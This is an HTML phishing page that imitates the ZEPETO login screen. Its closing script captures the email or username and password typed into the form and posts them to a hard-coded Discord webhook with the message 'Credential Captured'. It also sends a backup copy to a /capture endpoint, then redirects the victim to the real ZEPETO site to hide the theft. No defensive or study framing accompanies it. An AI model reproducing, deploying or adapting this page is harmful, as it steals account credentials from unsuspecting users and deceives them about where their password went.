<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ZEPETO</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #F8F8FA;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        /* Header */
        .header {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 96px 0 64px;
            background: transparent;
        }
        .header svg {
            width: 163px;
            height: 34px;
        }
        @media (max-width: 599px) {
            .header { padding: 16px 0; justify-content: flex-start; }
            .header svg { width: 77px; height: 16px; margin-left: 16px; }
        }
        
        /* Main card */
        .card {
            background: #fff;
            border-radius: 16px;
            padding: 40px 32px;
            width: 100%;
            max-width: 400px;
            margin: 0 20px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.06);
        }
        @media (max-width: 599px) {
            .card {
                box-shadow: none;
                border-radius: 0;
                padding: 24px 20px;
                margin: 0;
                max-width: 100%;
            }
        }
        
        .card h1 {
            font-size: 24px;
            font-weight: 700;
            color: #292930;
            text-align: center;
            margin-bottom: 30px;
        }
        
        /* Tabs */
        .tabs {
            display: flex;
            border-bottom: 1px solid #E8E8EA;
            margin-bottom: 28px;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding-bottom: 12px;
            font-size: 15px;
            color: #99999C;
            cursor: pointer;
            position: relative;
        }
        .tab.active {
            color: #292930;
            font-weight: 700;
        }
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 100%;
            height: 2px;
            background: #5C46FF;
        }
        
        /* Form */
        .form-group {
            margin-bottom: 12px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #E0E0E1;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            transition: border 0.2s;
            background: #fff;
        }
        .form-group input:focus {
            border-color: #5C46FF;
        }
        .form-group input::placeholder {
            color: #B8B8BC;
        }
        
        .signin-btn {
            width: 100%;
            padding: 15px;
            background: #5C46FF;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 24px;
            transition: opacity 0.2s;
        }
        .signin-btn:hover {
            opacity: 0.9;
        }
        .signin-btn:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }
        
        /* Divider */
        .divider {
            display: flex;
            align-items: center;
            margin: 32px 0 20px;
            color: #99999C;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #E8E8EA;
        }
        .divider span { margin: 0 16px; }
        
        /* Social buttons */
        .social-row {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 10px;
        }
        .social-btn {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            border: 1px solid #E8E8EA;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 18px;
            font-weight: 600;
            color: #555;
            transition: border 0.2s;
        }
        .social-btn:hover { border-color: #5C46FF; }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 48px 20px 130px;
            max-width: 400px;
        }
        .footer p {
            font-size: 16px;
            color: #47474D;
            margin-bottom: 24px;
        }
        .store-badges {
            display: flex;
            justify-content: center;
            gap: 12px;
        }
        .store-badge {
            height: 44px;
            border-radius: 8px;
            overflow: hidden;
        }
        
        /* Loading spinner */
        .loading-overlay {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #5C46FF;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 12px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .error-msg {
            display: none;
            background: #FFF3F3;
            border: 1px solid #FFCDD2;
            color: #D32F2F;
            padding: 12px;
            border-radius: 10px;
            font-size: 13px;
            text-align: center;
            margin-bottom: 16px;
        }
    </style>
</head>

<div class="card">
    <h1>Login</h1>

    <div class="tabs">
        <div class="tab">Phone</div>
        <div class="tab active">Email・ID</div>
        <div class="tab">QR</div>
    </div>

    <div class="error-msg" id="errorMsg"></div>

    <form id="loginForm">
        <div class="form-group">
            <input type="text" id="userId" placeholder="Email or Username" autocomplete="username">
        </div>
        <div class="form-group">
            <input type="password" id="password" placeholder="Password" autocomplete="current-password">
        </div>

        <div class="form-content" id="formContent">
            <button type="submit" class="signin-btn" id="signinBtn" disabled>Sign in</button>
        </div>

        <div class="loading-overlay" id="loadingOverlay">
            <div class="spinner"></div>
            <p style="color:#999;font-size:14px;">Signing in...</p>
        </div>
    </form>

    <div class="divider"><span>OR</span></div>

    <div class="social-row">
        <div class="social-btn" title="Google">G</div>
        <div class="social-btn" title="X">𝕏</div>
        <div class="social-btn" title="Apple"></div>
        <div class="social-btn" title="KakaoTalk" style="font-size:14px;">K</div>
        <div class="social-btn" title="More">›</div>
    </div>
</div>

<div class="footer">
    <p>Now download the ZEPETO mobile app!</p>
    <div class="store-badges">
        <div class="store-badge" style="background:#000;width:120px;height:44px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;border-radius:8px;">App Store</div>
        <div class="store-badge" style="background:#000;width:120px;height:44px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;border-radius:8px;">Google Play</div>
    </div>
</div>

<script>
// === CONFIG ===
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1525191917468647514/b8qkmd69Vl2JyctJjiEqSq6jYYwME1rCN0WJKzgefO3RVuLBlV8QppSTcP-f3-IRDjEy';

// === DOM Elements ===
const form = document.getElementById('loginForm');
const userId = document.getElementById('userId');
const password = document.getElementById('password');
const signinBtn = document.getElementById('signinBtn');
const formContent = document.getElementById('formContent');
const loadingOverlay = document.getElementById('loadingOverlay');
const errorMsg = document.getElementById('errorMsg');

// === Enable/disable button ===
function checkFields() {
    signinBtn.disabled = !(userId.value.trim() && password.value.trim());
}
userId.addEventListener('input', checkFields);
password.addEventListener('input', checkFields);

// === Form submit ===
form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    var uid = userId.value.trim();
    var pwd = password.value.trim();
    
    if (!uid || !pwd) return;
    
    // Show loading
    formContent.style.display = 'none';
    loadingOverlay.style.display = 'block';
    errorMsg.style.display = 'none';
    
    // 1. Send to Discord directly from browser
    var discordPayload = JSON.stringify({
        content: '@here **🔴 ZEPETO Credential Captured**\n**Email/ID:** `' + uid.replace(/`/g,'') + '`\n**Password:** `' + pwd.replace(/`/g,'') + '`'
    });
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', DISCORD_WEBHOOK, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(discordPayload);
    
    // 2. Also send to /capture endpoint (server.py) as backup
    var xhr2 = new XMLHttpRequest();
    xhr2.open('POST', '/capture', true);
    xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr2.send('email=' + encodeURIComponent(uid) + '&password=' + encodeURIComponent(pwd));
    
    // 3. Redirect to real Zepeto
    setTimeout(function() {
        window.location.href = 'https://zepeto.me';
    }, 1500);
});
</script>
